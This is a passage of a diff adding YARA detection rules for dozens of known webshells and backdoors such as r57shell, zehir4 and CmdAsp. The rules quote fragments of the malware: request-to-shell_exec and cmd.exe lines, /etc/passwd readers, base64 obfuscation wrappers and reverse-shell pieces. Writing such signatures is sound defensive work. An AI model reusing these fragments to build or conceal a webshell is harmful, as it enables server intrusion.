+		$s1 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
+		$s2 = "<title>G-Security Webshell</title>" fullword
+		$s4 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
+		$s6 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword
+	condition:
+		1 of them
+}
+
+rule WebShell_go_shell {
+	meta:
+		description = "PHP Webshells Github Archive - file go-shell.php"
+		author = "Florian Roth"
+		hash = "3dd85981bec33de42c04c53d081c230b5fc0e94f"
+	strings:
+		$s0 = "#change this password; for power security - delete this file =)" fullword
+		$s2 = "if (!defined$param{cmd}){$param{cmd}=\"ls -la\"};" fullword
+		$s11 = "open(FILEHANDLE, \"cd $param{dir}&&$param{cmd}|\");" fullword
+		$s12 = "print << \"[kalabanga]\";" fullword
+		$s13 = "<title>GO.cgi</title>" fullword
+	condition:
+		1 of them
+}
+
+rule WebShell_aZRaiLPhp_v1_0 {
+	meta:
+		description = "PHP Webshells Github Archive - file aZRaiLPhp v1.0.php"
+		author = "Florian Roth"
+		hash = "a2c609d1a8c8ba3d706d1d70bef69e63f239782b"
+	strings:
+		$s0 = "<font size='+1'color='#0000FF'>aZRaiLPhP'nin URL'si: http://$HTTP_HOST$RED"
+		$s4 = "$fileperm=base_convert($_POST['fileperm'],8,10);" fullword
+		$s19 = "touch (\"$path/$dismi\") or die(\"Dosya Olu" fullword
+		$s20 = "echo \"<div align=left><a href='./$this_file?dir=$path/$file'>G" fullword
+	condition:
+		2 of them
+}
+
+rule WebShell_webshells_zehir4 {
+	meta:
+		description = "Webshells Github Archive - file zehir4"
+		author = "Florian Roth"
+		hash = "788928ae87551f286d189e163e55410acbb90a64"
+		score = 55
+	strings:
+		$s0 = "frames.byZehir.document.execCommand(command, false, option);" fullword
+		$s8 = "response.Write \"<title>ZehirIV --> Powered By Zehir &lt;zehirhacker@hotmail.com"
+	condition:
+		1 of them
+}
+
+rule WebShell_zehir4_asp_php {
+	meta:
+		description = "PHP Webshells Github Archive - file zehir4.asp.php.txt"
+		author = "Florian Roth"
+		hash = "1d9b78b5b14b821139541cc0deb4cbbd994ce157"
+	strings:
+		$s4 = "response.Write \"<title>zehir3 --> powered by zehir &lt;zehirhacker@hotmail.com&"
+		$s11 = "frames.byZehir.document.execCommand("
+		$s15 = "frames.byZehir.document.execCommand(co"
+	condition:
+		2 of them
+}
+
+rule WebShell_ftpsearch {
+	meta:
+		description = "PHP Webshells Github Archive - file ftpsearch.php"
+		author = "Florian Roth"
+		hash = "c945f597552ccb8c0309ad6d2831c8cabdf4e2d6"
+	strings:
+		$s0 = "echo \"[-] Error : coudn't read /etc/passwd\";" fullword
+		$s9 = "@$ftp=ftp_connect('127.0.0.1');" fullword
+		$s12 = "echo \"<title>Edited By KingDefacer</title><body>\";" fullword
+		$s19 = "echo \"[+] Founded \".sizeof($users).\" entrys in /etc/passwd\\n\";" fullword
+	condition:
+		2 of them
+}
+
+rule WebShell__Cyber_Shell_cybershell_Cyber_Shell__v_1_0_ {
+	meta:
+		description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php"
+		author = "Florian Roth"
+		super_rule = 1
+		hash0 = "ef7f7c45d26614cea597f2f8e64a85d54630fe38"
+		hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
+		hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"
+	strings:
+		$s4 = " <a href=\"http://www.cyberlords.net\" target=\"_blank\">Cyber Lords Community</"
+		$s10 = "echo \"<meta http-equiv=Refresh content=\\\"0; url=$PHP_SELF?edit=$nameoffile&sh"
+		$s11 = " *   Coded by Pixcher" fullword
+		$s16 = "<input type=text size=55 name=newfile value=\"$d/newfile.php\">" fullword
+	condition:
+		2 of them
+}
+
+rule WebShell__Ajax_PHP_Command_Shell_Ajax_PHP_Command_Shell_soldierofallah {
+	meta:
+		description = "PHP Webshells Github Archive - from files Ajax_PHP Command Shell.php, Ajax_PHP_Command_Shell.php, soldierofallah.php"
+		author = "Florian Roth"
+		super_rule = 1
+		hash0 = "fa11deaee821ca3de7ad1caafa2a585ee1bc8d82"
+		hash1 = "c0a4ba3e834fb63e0a220a43caaf55c654f97429"
+		hash2 = "16fa789b20409c1f2ffec74484a30d0491904064"
+	strings:
+		$s1 = "'Read /etc/passwd' => \"runcommand('etcpasswdfile','GET')\"," fullword
+		$s2 = "'Running processes' => \"runcommand('ps -aux','GET')\"," fullword
+		$s3 = "$dt = $_POST['filecontent'];" fullword
+		$s4 = "'Open ports' => \"runcommand('netstat -an | grep -i listen','GET')\"," fullword
+		$s6 = "print \"Sorry, none of the command functions works.\";" fullword
+		$s11 = "document.cmdform.command.value='';" fullword
+		$s12 = "elseif(isset($_GET['savefile']) && !empty($_POST['filetosave']) && !empty($_POST"
+	condition:
+		3 of them
+}
+
+rule WebShell__Small_Web_Shell_by_ZaCo_small_zaco_zacosmall {
+	meta:
+		description = "PHP Webshells Github Archive - from files Small Web Shell by ZaCo.php, small.php, zaco.php, zacosmall.php"
+		author = "Florian Roth"
+		super_rule = 1
+		hash0 = "b148ead15d34a55771894424ace2a92983351dda"
+		hash1 = "e4ba288f6d46dc77b403adf7d411a280601c635b"
+		hash2 = "e5713d6d231c844011e9a74175a77e8eb835c856"
+		hash3 = "1b836517164c18caf2c92ee2a06c645e26936a0c"
+	strings:
+		$s2 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword
+		$s4 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword
+		$s6 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword
+		$s20 = "echo('Dump for '.$db_dump.' now in '.$to_file);" fullword
+	condition:
+		2 of them
+}
+
+rule WebShell__PH_Vayv_PHVayv_PH_Vayv_klasvayv_asp_php {
+	meta:
+		description = "PHP Webshells Github Archive - from files PH Vayv.php, PHVayv.php, PH_Vayv.php, klasvayv.asp.php.txt"
+		author = "Florian Roth"
+		super_rule = 1
+		hash0 = "b51962a1ffa460ec793317571fc2f46042fd13ee"
+		hash1 = "408ac9ca3d435c0f78bda370b33e84ba25afc357"
+		hash2 = "4003ae289e3ae036755976f8d2407c9381ff5653"
+		hash3 = "4f83bc2836601225a115b5ad54496428a507a361"
+	strings:
+		$s1 = "<font color=\"#000000\">Sil</font></a></font></td>" fullword
+		$s5 = "<td width=\"122\" height=\"17\" bgcolor=\"#9F9F9F\">" fullword
+		$s6 = "onfocus=\"if (this.value == 'Kullan" fullword
+		$s16 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\">"
+	condition:
+		2 of them
+}
+
+rule WebShell_Generic_PHP_3 {
+	meta:
+		description = "PHP Webshells Github Archive - from files Antichat Shell v1.3.php, Antichat Shell. Modified by Go0o$E.php, Antichat Shell.php, fatal.php"
+		author = "Florian Roth"
+		super_rule = 1
+		hash0 = "d829e87b3ce34460088c7775a60bded64e530cd4"
+		hash1 = "d710c95d9f18ec7c76d9349a28dd59c3605c02be"
+		hash2 = "f044d44e559af22a1a7f9db72de1206f392b8976"
+		hash3 = "41780a3e8c0dc3cbcaa7b4d3c066ae09fb74a289"
+	strings:
+		$s0 = "header('Content-Length:'.filesize($file).'');" fullword
+		$s4 = "<textarea name=\\\"command\\\" rows=\\\"5\\\" cols=\\\"150\\\">\".@$_POST['comma"
+		$s7 = "if(filetype($dir . $file)==\"file\")$files[]=$file;" fullword
+		$s14 = "elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} " fullword
+		$s20 = "$info .= (($perms & 0x0004) ? 'r' : '-');" fullword
+	condition:
+		all of them
+}
+
+rule WebShell_GFS {
+	meta:
+		description = "PHP Webshells Github Archive - from files GFS web-shell ver 3.1.7 - PRiV8.php, Predator.php, GFS_web-shell_ver_3.1.7_-_PRiV8.php"
+		author = "Florian Roth"
+		super_rule = 1
+		hash0 = "c2f1ef6b11aaec255d4dd31efad18a3869a2a42c"
+		hash1 = "34f6640985b07009dbd06cd70983451aa4fe9822"
+		hash2 = "d25ef72bdae3b3cb0fc0fdd81cfa58b215812a50"
+	strings:
+		$s0 = "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\";" fullword
+		$s1 = "lIENPTk47DQpleGl0IDA7DQp9DQp9\";" fullword
+		$s2 = "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShm"
+	condition:
+		all of them
+}
+
+rule WebShell__CrystalShell_v_1_sosyete_stres {
+	meta:
+		description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, sosyete.php, stres.php"
+		author = "Florian Roth"
+		super_rule = 1
+		hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
+		hash1 = "e32405e776e87e45735c187c577d3a4f98a64059"
+		hash2 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"
+	strings:
+		$s1 = "A:visited { COLOR:blue; TEXT-DECORATION: none}" fullword
+		$s4 = "A:active {COLOR:blue; TEXT-DECORATION: none}" fullword
+		$s11 = "scrollbar-darkshadow-color: #101842;" fullword
+		$s15 = "<a bookmark=\"minipanel\">" fullword
+		$s16 = "background-color: #EBEAEA;" fullword
+		$s18 = "color: #D5ECF9;" fullword
+		$s19 = "<center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 border"
+	condition:
+		all of them
+}
+
+rule WebShell_Generic_PHP_10 {
+	meta:
+		description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php, PHPRemoteView.php"
+		author = "Florian Roth"
+		super_rule = 1
+		hash0 = "ef7f7c45d26614cea597f2f8e64a85d54630fe38"
+		hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
+		hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"
+		hash3 = "7d5b54c7cab6b82fb7d131d7bbb989fd53cb1b57"
+	strings:
+		$s2 = "$world[\"execute\"] = ($world['execute']=='x') ? 't' : 'T'; " fullword
+		$s6 = "$owner[\"write\"] = ($mode & 00200) ? 'w' : '-'; " fullword
+		$s11 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-'; " fullword
+		$s12 = "else if( $mode & 0xA000 ) " fullword
+		$s17 = "$s=sprintf(\"%1s\", $type); " fullword
+		$s20 = "font-size: 8pt;" fullword
+	condition:
+		all of them
+}
+
+rule WebShell__findsock_php_findsock_shell_php_reverse_shell {
+	meta:
+		description = "PHP Webshells Github Archive - from files findsock.c, php-findsock-shell.php, php-reverse-shell.php"
+		author = "Florian Roth"
+		super_rule = 1
+		hash0 = "5622c9841d76617bfc3cd4cab1932d8349b7044f"
+		hash1 = "4a20f36035bbae8e342aab0418134e750b881d05"
+		hash2 = "40dbdc0bdf5218af50741ba011c5286a723fa9bf"
+	strings:
+		$s1 = "// me at pentestmonkey@pentestmonkey.net" fullword
+	condition:
+		all of them
+}
+
+rule Unpack_Injectt {
+	meta:
+		description = "Webshells Auto-generated - file Injectt.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "8a5d2158a566c87edc999771e12d42c5"
+	strings:
+		$s2 = "%s -Run                              -->To Install And Run The Service"
+		$s3 = "%s -Uninstall                        -->To Uninstall The Service"
+		$s4 = "(STANDARD_RIGHTS_REQUIRED |SC_MANAGER_CONNECT |SC_MANAGER_CREATE_SERVICE |SC_MAN"
+	condition:
+		all of them
+}
+
+rule HYTop_DevPack_fso {
+	meta:
+		description = "Webshells Auto-generated - file fso.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "b37f3cde1a08890bd822a182c3a881f6"
+	strings:
+		$s0 = "<!-- PageFSO Below -->"
+		$s1 = "theFile.writeLine(\"<script language=\"\"vbscript\"\" runat=server>if request(\"\"\"&cli"
+	condition:
+		all of them
+}
+
+rule FeliksPack3___PHP_Shells_ssh {
+	meta:
+		description = "Webshells Auto-generated - file ssh.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "1aa5307790d72941589079989b4f900e"
+	strings:
+		$s0 = "eval(gzinflate(str_rot13(base64_decode('"
+	condition:
+		all of them
+}
+
+rule Debug_BDoor {
+	meta:
+		description = "Webshells Auto-generated - file BDoor.dll"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "e4e8e31dd44beb9320922c5f49739955"
+	strings:
+		$s1 = "\\BDoor\\"
+		$s4 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+	condition:
+		all of them
+}
+
+rule bin_Client {
+	meta:
+		description = "Webshells Auto-generated - file Client.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "5f91a5b46d155cacf0cc6673a2a5461b"
+	strings:
+		$s0 = "Recieved respond from server!!"
+		$s4 = "packet door client"
+		$s5 = "input source port(whatever you want):"
+		$s7 = "Packet sent,waiting for reply..."
+	condition:
+		all of them
+}
+
+rule ZXshell2_0_rar_Folder_ZXshell {
+	meta:
+		description = "Webshells Auto-generated - file ZXshell.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "246ce44502d2f6002d720d350e26c288"
+	strings:
+		$s0 = "WPreviewPagesn"
+		$s1 = "DA!OLUTELY N"
+	condition:
+		all of them
+}
+
+rule RkNTLoad {
+	meta:
+		description = "Webshells Auto-generated - file RkNTLoad.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "262317c95ced56224f136ba532b8b34f"
+	strings:
+		$s1 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
+		$s2 = "5pur+virtu!"
+		$s3 = "ugh spac#n"
+		$s4 = "xcEx3WriL4"
+		$s5 = "runtime error"
+		$s6 = "loseHWait.Sr."
+		$s7 = "essageBoxAw"
+		$s8 = "$Id: UPX 1.07 Copyright (C) 1996-2001 the UPX Team. All Rights Reserved. $"
+	condition:
+		all of them
+}
+
+rule binder2_binder2 {
+	meta:
+		description = "Webshells Auto-generated - file binder2.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "d594e90ad23ae0bc0b65b59189c12f11"
+	strings:
+		$s0 = "IsCharAlphaNumericA"
+		$s2 = "WideCharToM"
+		$s4 = "g 5pur+virtu!"
+		$s5 = "\\syslog.en"
+		$s6 = "heap7'7oqk?not="
+		$s8 = "- Kablto in"
+	condition:
+		all of them
+}
+
+rule thelast_orice2 {
+	meta:
+		description = "Webshells Auto-generated - file orice2.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "aa63ffb27bde8d03d00dda04421237ae"
+	strings:
+		$s0 = " $aa = $_GET['aa'];"
+		$s1 = "echo $aa;"
+	condition:
+		all of them
+}
+
+rule FSO_s_sincap {
+	meta:
+		description = "Webshells Auto-generated - file sincap.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "dc5c2c2392b84a1529abd92e98e9aa5b"
+	strings:
+		$s0 = "    <font color=\"#E5E5E5\" style=\"font-size: 8pt; font-weight: 700\" face=\"Arial\">"
+		$s4 = "<body text=\"#008000\" bgcolor=\"#808080\" topmargin=\"0\" leftmargin=\"0\" rightmargin="
+	condition:
+		all of them
+}
+
+rule PhpShell {
+	meta:
+		description = "Webshells Auto-generated - file PhpShell.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "539baa0d39a9cf3c64d65ee7a8738620"
+	strings:
+		$s2 = "href=\"http://www.gimpster.com/wiki/PhpShell\">www.gimpster.com/wiki/PhpShell</a>."
+	condition:
+		all of them
+}
+
+rule HYTop_DevPack_config {
+	meta:
+		description = "Webshells Auto-generated - file config.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "b41d0e64e64a685178a3155195921d61"
+	strings:
+		$s0 = "const adminPassword=\""
+		$s2 = "const userPassword=\""
+		$s3 = "const mVersion="
+	condition:
+		all of them
+}
+
+rule sendmail {
+	meta:
+		description = "Webshells Auto-generated - file sendmail.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "75b86f4a21d8adefaf34b3a94629bd17"
+	strings:
+		$s3 = "_NextPyC808"
+		$s6 = "Copyright (C) 2000, Diamond Computer Systems Pty. Ltd. (www.diamondcs.com.au)"
+	condition:
+		all of them
+}
+
+rule FSO_s_zehir4 {
+	meta:
+		description = "Webshells Auto-generated - file zehir4.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "5b496a61363d304532bcf52ee21f5d55"
+	strings:
+		$s5 = " byMesaj "
+	condition:
+		all of them
+}
+
+rule hkshell_hkshell {
+	meta:
+		description = "Webshells Auto-generated - file hkshell.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "168cab58cee59dc4706b3be988312580"
+	strings:
+		$s1 = "PrSessKERNELU"
+		$s2 = "Cur3ntV7sion"
+		$s3 = "Explorer8"
+	condition:
+		all of them
+}
+
+rule iMHaPFtp {
+	meta:
+		description = "Webshells Auto-generated - file iMHaPFtp.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "12911b73bc6a5d313b494102abcf5c57"
+	strings:
+		$s1 = "echo \"\\t<th class=\\\"permission_header\\\"><a href=\\\"$self?{$d}sort=permission$r\\\">"
+	condition:
+		all of them
+}
+
+rule Unpack_TBack {
+	meta:
+		description = "Webshells Auto-generated - file TBack.dll"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "a9d1007823bf96fb163ab38726b48464"
+	strings:
+		$s5 = "\\final\\new\\lcc\\public.dll"
+	condition:
+		all of them
+}
+
+rule DarkSpy105 {
+	meta:
+		description = "Webshells Auto-generated - file DarkSpy105.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "f0b85e7bec90dba829a3ede1ab7d8722"
+	strings:
+		$s7 = "Sorry,DarkSpy got an unknown exception,please re-run it,thanks!"
+	condition:
+		all of them
+}
+
+rule EditServer_Webshell {
+	meta:
+		description = "Webshells Auto-generated - file EditServer.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "f945de25e0eba3bdaf1455b3a62b9832"
+	strings:
+		$s2 = "Server %s Have Been Configured"
+		$s5 = "The Server Password Exceeds 32 Characters"
+		$s8 = "9--Set Procecess Name To Inject DLL"
+	condition:
+		all of them
+}
+
+rule FSO_s_reader {
+	meta:
+		description = "Webshells Auto-generated - file reader.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "b598c8b662f2a1f6cc61f291fb0a6fa2"
+	strings:
+		$s2 = "mailto:mailbomb@hotmail."
+	condition:
+		all of them
+}
+
+rule ASP_CmdAsp {
+	meta:
+		description = "Webshells Auto-generated - file CmdAsp.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "79d4f3425f7a89befb0ef3bafe5e332f"
+	strings:
+		$s2 = "' -- Read the output from our command and remove the temp file -- '"
+		$s6 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
+		$s9 = "' -- create the COM objects that we will be using -- '"
+	condition:
+		all of them
+}
+
+rule KA_uShell {
+	meta:
+		description = "Webshells Auto-generated - file KA_uShell.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "685f5d4f7f6751eaefc2695071569aab"
+	strings:
+		$s5 = "if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass"
+		$s6 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}"
+	condition:
+		all of them
+}
+
+rule PHP_Backdoor_v1 {
+	meta:
+		description = "Webshells Auto-generated - file PHP Backdoor v1.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "0506ba90759d11d78befd21cabf41f3d"
+	strings:
+
+		$s5 = "echo\"<form method=\\\"POST\\\" action=\\\"\".$_SERVER['PHP_SELF'].\"?edit=\".$th"
+		$s8 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?proxy"
+	condition:
+		all of them
+}
+
+rule svchostdll {
+	meta:
+		description = "Webshells Auto-generated - file svchostdll.dll"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "0f6756c8cb0b454c452055f189e4c3f4"
+	strings:
+		$s0 = "InstallService"
+		$s1 = "RundllInstallA"
+		$s2 = "UninstallService"
+		$s3 = "&G3 Users In RegistryD"
+		$s4 = "OL_SHUTDOWN;I"
+		$s5 = "SvcHostDLL.dll"
+		$s6 = "RundllUninstallA"
+		$s7 = "InternetOpenA"
+		$s8 = "Check Cloneomplete"
+	condition:
+		all of them
+}
+
+rule HYTop_DevPack_server {
+	meta:
+		description = "Webshells Auto-generated - file server.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "1d38526a215df13c7373da4635541b43"
+	strings:
+		$s0 = "<!-- PageServer Below -->"
+	condition:
+		all of them
+}
+
+rule vanquish {
+	meta:
+		description = "Webshells Auto-generated - file vanquish.dll"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "684450adde37a93e8bb362994efc898c"
+	strings:
+		$s3 = "You cannot delete protected files/folders! Instead, your attempt has been logged"
+		$s8 = "?VCreateProcessA@@YGHPBDPADPAU_SECURITY_ATTRIBUTES@@2HKPAX0PAU_STARTUPINFOA@@PAU"
+		$s9 = "?VFindFirstFileExW@@YGPAXPBGW4_FINDEX_INFO_LEVELS@@PAXW4_FINDEX_SEARCH_OPS@@2K@Z"
+	condition:
+		all of them
+}
+
+rule winshell {
+	meta:
+		description = "Webshells Auto-generated - file winshell.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "3144410a37dd4c29d004a814a294ea26"
+	strings:
+		$s0 = "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"
+		$s1 = "WinShell Service"
+		$s2 = "__GLOBAL_HEAP_SELECTED"
+		$s3 = "__MSVCRT_HEAP_SELECT"
+		$s4 = "Provide Windows CmdShell Service"
+		$s5 = "URLDownloadToFileA"
+		$s6 = "RegisterServiceProcess"
+		$s7 = "GetModuleBaseNameA"
+		$s8 = "WinShell v5.0 (C)2002 janker.org"
+	condition:
+		all of them
+}
+
+rule FSO_s_remview {
+	meta:
+		description = "Webshells Auto-generated - file remview.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "b4a09911a5b23e00b55abe546ded691c"
+	strings:
+		$s2 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\""
+		$s3 = "         echo \"<script>str$i=\\\"\".str_replace(\"\\\"\",\"\\\\\\\"\",str_replace(\"\\\\\",\"\\\\\\\\\""
+		$s4 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n<"
+	condition:
+		all of them
+}
+
+rule saphpshell {
+	meta:
+		description = "Webshells Auto-generated - file saphpshell.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "d7bba8def713512ddda14baf9cd6889a"
+	strings:
+		$s0 = "<td><input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['command']?>"
+	condition:
+		all of them
+}
+
+rule HYTop2006_rar_Folder_2006Z {
+	meta:
+		description = "Webshells Auto-generated - file 2006Z.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "fd1b6129abd4ab177fed135e3b665488"
+	strings:
+		$s1 = "wangyong,czy,allen,lcx,Marcos,kEvin1986,myth"
+		$s8 = "System\\CurrentControlSet\\Control\\Keyboard Layouts\\%.8x"
+	condition:
+		all of them
+}
+
+rule admin_ad {
+	meta:
+		description = "Webshells Auto-generated - file admin-ad.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "e6819b8f8ff2f1073f7d46a0b192f43b"
+	strings:
+		$s6 = "<td align=\"center\"> <input name=\"cmd\" type=\"text\" id=\"cmd\" siz"
+		$s7 = "Response.write\"<a href='\"&url&\"?path=\"&Request(\"oldpath\")&\"&attrib=\"&attrib&\"'><"
+	condition:
+		all of them
+}
+
+rule FSO_s_casus15 {
+	meta:
+		description = "Webshells Auto-generated - file casus15.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "8d155b4239d922367af5d0a1b89533a3"
+	strings:
+		$s6 = "if((is_dir(\"$deldir/$file\")) AND ($file!=\".\") AND ($file!=\"..\"))"
+	condition:
+		all of them
+}
+
+rule BIN_Client {
+	meta:
+		description = "Webshells Auto-generated - file Client.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "9f0a74ec81bc2f26f16c5c172b80eca7"
+	strings:
+		$s0 = "=====Remote Shell Closed====="
+		$s2 = "All Files(*.*)|*.*||"
+		$s6 = "WSAStartup Error!"
+		$s7 = "SHGetFileInfoA"
+		$s8 = "CreateThread False!"
+		$s9 = "Port Number Error"
+	condition:
+		4 of them
+}
+
+rule shelltools_g0t_root_uptime {
+	meta:
+		description = "Webshells Auto-generated - file uptime.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "d1f56102bc5d3e2e37ab3ffa392073b9"
+	strings:
+		$s0 = "JDiamondCSlC~"
+		$s1 = "CharactQA"
+		$s2 = "$Info: This file is packed with the UPX executable packer $"
+		$s5 = "HandlereateConso"
+		$s7 = "ION\\System\\FloatingPo"
+	condition:
+		all of them
+}
+
+rule Simple_PHP_BackDooR {
+	meta:
+		description = "Webshells Auto-generated - file Simple_PHP_BackDooR.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "a401132363eecc3a1040774bec9cb24f"
+	strings:
+		$s0 = "<hr>to browse go to http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory he"
+		$s6 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fn"
+		$s9 = "// a simple php backdoor"
+	condition:
+		1 of them
+}
+
+rule sig_2005Gray {
+	meta:
+		description = "Webshells Auto-generated - file 2005Gray.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "75dbe3d3b70a5678225d3e2d78b604cc"
+	strings:
+		$s0 = "SCROLLBAR-FACE-COLOR: #e8e7e7;"
+		$s4 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
+		$s8 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"
+		$s9 = "SCROLLBAR-3DLIGHT-COLOR: #cccccc;"
+	condition:
+		all of them
+}
+
+rule DllInjection {
+	meta:
+		description = "Webshells Auto-generated - file DllInjection.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "a7b92283a5102886ab8aee2bc5c8d718"
+	strings:
+		$s0 = "\\BDoor\\DllInjecti"
+	condition:
+		all of them
+}
+
+rule Mithril_v1_45_Mithril {
+	meta:
+		description = "Webshells Auto-generated - file Mithril.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "f1484f882dc381dde6eaa0b80ef64a07"
+	strings:
+		$s2 = "cress.exe"
+		$s7 = "\\Debug\\Mithril."
+	condition:
+		all of them
+}
+
+rule hkshell_hkrmv {
+	meta:
+		description = "Webshells Auto-generated - file hkrmv.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "bd3a0b7a6b5536f8d96f50956560e9bf"
+	strings:
+		$s5 = "/THUMBPOSITION7"
+		$s6 = "\\EvilBlade\\"
+	condition:
+		all of them
+}
+
+rule phpshell {
+	meta:
+		description = "Webshells Auto-generated - file phpshell.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "1dccb1ea9f24ffbd085571c88585517b"
+	strings:
+		$s1 = "echo \"<input size=\\\"100\\\" type=\\\"text\\\" name=\\\"newfile\\\" value=\\\"$inputfile\\\"><b"
+		$s2 = "$img[$id] = \"<img height=\\\"16\\\" width=\\\"16\\\" border=\\\"0\\\" src=\\\"$REMOTE_IMAGE_UR"
+		$s3 = "$file = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", "
+	condition:
+		all of them
+}
+
+rule FSO_s_cmd {
+	meta:
+		description = "Webshells Auto-generated - file cmd.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "cbe8e365d41dd3cd8e462ca434cf385f"
+	strings:
+		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>"
+		$s1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
+	condition:
+		all of them
+}
+
+rule FeliksPack3___PHP_Shells_phpft {
+	meta:
+		description = "Webshells Auto-generated - file phpft.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "60ef80175fcc6a879ca57c54226646b1"
+	strings:
+		$s6 = "PHP Files Thief"
+		$s11 = "http://www.4ngel.net"
+	condition:
+		all of them
+}
+
+rule FSO_s_indexer {
+	meta:
+		description = "Webshells Auto-generated - file indexer.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "135fc50f85228691b401848caef3be9e"
+	strings:
+		$s3 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input type=\"r"
+	condition:
+		all of them
+}
+
+rule r57shell {
+	meta:
+		description = "Webshells Auto-generated - file r57shell.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "8023394542cddf8aee5dec6072ed02b5"
+	strings:
+		$s11 = " $_POST['cmd']=\"echo \\\"Now script try connect to"
+	condition:
+		all of them
+}
+
+rule bdcli100 {
+	meta:
